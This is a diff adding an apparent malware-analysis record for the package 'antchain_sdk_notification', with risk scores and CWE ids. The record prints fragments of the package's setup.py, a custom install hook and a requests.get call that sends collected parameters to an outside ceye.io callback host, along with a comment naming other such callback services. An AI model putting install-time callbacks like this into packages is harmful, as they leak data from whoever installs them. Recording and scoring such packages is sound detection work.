@@ -1,0 +1,36 @@
+{
+  "package_metadata": {
+    "name": "antchain_sdk_notification",
+    "version": "1.0.0",
+    "author_email": "test"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "http://5r13v9.ceye.io"
+    ],
+    "process_spawns": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "setup(name='antchain_sdk_notification', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "requests.get(\"http://5r13v9.ceye.io\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\\n'"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.875,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
